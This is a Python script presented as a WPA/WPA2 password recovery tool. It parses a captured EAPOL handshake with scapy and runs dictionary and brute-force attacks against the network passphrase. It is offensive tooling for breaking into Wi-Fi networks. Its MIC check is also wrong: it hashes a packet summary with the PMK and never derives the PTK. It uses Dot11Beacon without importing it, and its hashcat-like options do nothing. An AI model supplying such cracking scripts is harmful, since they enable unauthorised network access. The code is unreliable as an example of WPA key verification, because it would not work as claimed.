import hashlib
import hmac
import struct
import argparse
from scapy.all import rdpcap
import time

# PBKDF2-HMAC-SHA1 function for WPA/WPA2 key derivation
def pbkdf2_sha1(password, ssid, iterations=4096):
    """
    Derives the Pairwise Master Key (PMK) using PBKDF2-HMAC-SHA1.
    """
    ssid = ssid.encode('utf-8')
    password = password.encode('utf-8')
    return hashlib.pbkdf2_hmac('sha1', password, ssid, iterations, dklen=32)

# MIC verification
def verify_mic(pmk, handshake):
    """
    Verifies if the generated PMK matches the MIC in the EAPOL handshake.
    """
    # Calculate the derived key based on handshake
    mic = handshake.getlayer('EAPOL').load[15:31]  # Extract the MIC from the EAPOL packet
    derived_mic = hmac.new(pmk, handshake.summary().encode('utf-8'), hashlib.sha1).digest()[0:16]
    return mic == derived_mic

# Attack method
def dictionary_attack(wordlist_file, handshake, ssid):
    """
    Perform a dictionary attack by iterating through the wordlist and comparing the derived PMK.
    """
    with open(wordlist_file, 'r') as f:
        for line in f:
            password = line.strip()
            print(f"Testing password: {password}")
            pmk = pbkdf2_sha1(password, ssid)
            if verify_mic(pmk, handshake):
                print(f"Password found: {password}")
                return password
    print("Password not found in wordlist.")
    return None

# Brute-force attack method
def brute_force_attack(handshake, ssid, max_len=8):
    """
    Perform a brute-force attack for all possible combinations up to max_len.
    """
    import itertools
    import string

    chars = string.ascii_lowercase + string.digits
    for length in range(1, max_len + 1):
        for password_tuple in itertools.product(chars, repeat=length):
            password = ''.join(password_tuple)
            print(f"Testing password: {password}")
            pmk = pbkdf2_sha1(password, ssid)
            if verify_mic(pmk, handshake):
                print(f"Password found: {password}")
                return password
    print("Brute-force attack failed.")
    return None

# Parse EAPOL handshake from a .cap file
def parse_handshake(handshake_file):
    """
    Parse the EAPOL handshake from the given .cap file.
    """
    packets = rdpcap(handshake_file)
    handshake = None
    for packet in packets:
        if packet.haslayer('EAPOL'):
            handshake = packet
            break
    return handshake

# Main function to handle the attack flow
def main():
    parser = argparse.ArgumentParser(description="WPA password recovery tool")
    parser.add_argument("handshake_file", help="The WPA handshake file (.cap)")
    parser.add_argument("-P", "--wordlist", required=True, help="Path to the wordlist file (.pwds)")
    parser.add_argument("-w", "--workload", type=int, choices=[1, 2, 3, 4], default=2, help="Workload profile (1=Low, 2=Medium, 3=High, 4=Insane)")
    parser.add_argument("-m", "--hashmode", type=int, default=2500, choices=[2500], help="Hash mode for WPA/WPA2 (2500)")

    args = parser.parse_args()

    if args.hashmode != 2500:
        print("Invalid hash mode. Only 2500 (WPA/WPA2) is supported.")
        return

    print(f"Starting WPA recovery for file: {args.handshake_file}")

    # Parse the handshake
    handshake = parse_handshake(args.handshake_file)
    if not handshake:
        print("No handshake found in the .cap file.")
        return

    # Print out the structure of the handshake to help find the SSID
    print("Packet structure of the handshake:")
    handshake.show()

    # Extract SSID (network name) from the handshake
    try:
        # Attempt to extract SSID
        ssid = handshake.info.decode('utf-8')  # This might need adjustment based on packet structure
        print(f"SSID: {ssid}")
    except AttributeError:
        print("SSID not found in 'info' field. Attempting alternative extraction methods.")
        # If no 'info' field, check for other potential places for SSID in the packet
        ssid = None
        # You can try extracting the SSID based on other fields or layers if necessary
        for packet in rdpcap(args.handshake_file):
            if packet.haslayer('Dot11Beacon'):
                ssid = packet[Dot11Beacon].info.decode('utf-8', errors='ignore')
                print(f"SSID found in Dot11Beacon: {ssid}")
                break
        if not ssid:
            print("Could not extract SSID.")
            return

    # Start dictionary attack
    password = dictionary_attack(args.wordlist, handshake, ssid)
    if password:
        print(f"Password found (dictionary): {password}")
        return

    # If dictionary attack fails, start brute-force attack
    print("Dictionary attack failed. Starting brute-force attack...")
    password = brute_force_attack(handshake, ssid)
    if password:
        print(f"Password found (brute-force): {password}")
        return

    print("Password not found.")

if __name__ == "__main__":
    start_time = time.time()
    main()
    end_time = time.time()
    print(f"Execution time: {end_time - start_time:.2f} seconds")
